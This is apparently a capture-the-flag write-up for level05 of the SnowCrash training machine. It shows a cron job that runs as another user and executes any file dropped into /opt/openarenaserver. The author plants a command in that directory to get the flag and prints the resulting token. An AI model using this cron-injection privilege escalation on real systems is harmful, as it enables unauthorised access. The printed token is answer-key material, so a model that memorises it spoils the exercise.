# level05

When we connect on the machine, we have a message displayed: 
```bash
level05@192.168.56.116's password: 
You have new mail.
level05@SnowCrash:~$ cd /var/mail/
level05@SnowCrash:/var/mail$ ls
level05
level05@SnowCrash:/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

The `level05` file seem to be an hint about a crontab.

The home is empty but in `/usr/sbin/openarenaserver` have a `sh script`.
It execute all files presents in `/opt/openarenaserver/` and delete it.  

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We must create a file with our command like `/bin/getflag`. Because of the file is deleted after his execution,
we must redirect the output in a `safe file` like `/tmp/flag`.

```bash
level05@SnowCrash:/var/mail$ echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/file
level05@SnowCrash:/var/mail$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/var/mail$ su level06
Password: 
level06@SnowCrash:~$
```

